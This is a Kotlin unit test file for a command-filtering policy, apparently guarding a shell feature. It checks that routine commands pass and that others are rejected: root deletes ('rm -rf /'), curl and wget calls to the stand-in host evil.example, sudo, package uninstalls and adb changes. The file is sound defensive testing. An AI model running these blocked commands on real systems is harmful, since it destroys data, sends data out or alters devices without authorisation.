package com.orin.app

import com.orin.app.security.CommandPolicy
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Test

class CommandPolicyTest {

    @Test
    fun `normal workspace commands are allowed`() {
        assertNull(CommandPolicy.rejectionReason("git status"))
        assertNull(CommandPolicy.rejectionReason("ls -la"))
        assertNull(CommandPolicy.rejectionReason("python script.py"))
    }

    @Test
    fun `recursive root delete is blocked`() {
        assertNotNull(CommandPolicy.rejectionReason("rm -rf /"))
        assertNotNull(CommandPolicy.rejectionReason("rm -rf /*"))
    }

    @Test
    fun `network exfiltration tools are blocked`() {
        assertNotNull(CommandPolicy.rejectionReason("curl https://evil.example"))
        assertNotNull(CommandPolicy.rejectionReason("wget http://evil.example/x"))
    }

    @Test
    fun `privilege and system mutation commands are blocked`() {
        assertNotNull(CommandPolicy.rejectionReason("sudo reboot"))
        assertNotNull(CommandPolicy.rejectionReason("pm uninstall com.example"))
        assertNotNull(CommandPolicy.rejectionReason("settings put global adb_enabled 1"))
    }

    @Test
    fun `empty and oversized commands are rejected`() {
        assertNotNull(CommandPolicy.rejectionReason("   "))
        assertNotNull(CommandPolicy.rejectionReason("a".repeat(2001)))
    }
}
